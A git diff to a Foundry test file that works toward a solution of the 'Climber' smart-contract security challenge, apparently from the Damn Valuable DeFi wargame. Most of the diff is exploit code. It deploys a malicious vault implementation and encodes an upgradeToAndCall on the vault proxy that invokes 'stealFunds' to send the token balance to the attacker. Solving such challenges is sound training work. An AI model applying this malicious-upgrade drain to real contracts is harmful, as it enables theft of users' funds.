@@ -8,6 +8,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {ClimberVaultV2} from "../../../src/Contracts/climber/ClimberVaultV2.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -16,6 +17,7 @@ contract Climber is Test {
     DamnValuableToken internal dvt;
     ClimberTimelock internal climberTimelock;
     ClimberVault internal climberImplementation;
+    ClimberVaultV2 internal climberImplementation2;
     ERC1967Proxy internal climberVaultProxy;
     address[] internal users;
     address payable internal deployer;
@@ -92,15 +94,22 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        climberImplementation2 = new ClimberVaultV2();
         address[] memory targets = new address[](1);
-        targets[0] = address(climberTimelock);
+        targets[0] = address(climberVaultProxy);
         uint256[] memory values = new uint256[](1);
         bytes[] memory datas = new bytes[](1);
 
         values[0] = uint256(0);
+        bytes memory data = abi.encodeWithSignature(
+            "stealFunds(address,address)",
+            address(dvt),
+            attacker
+        );
         datas[0] = abi.encodeWithSignature(
-            "updateDelay(uint64)",
-            0
+            "upgradeToAndCall(address,bytes)",
+            address(climberImplementation2),
+            data
         );
         bytes32 salt = keccak256(abi.encodePacked(block.timestamp, attacker));
         vm.startPrank(attacker);
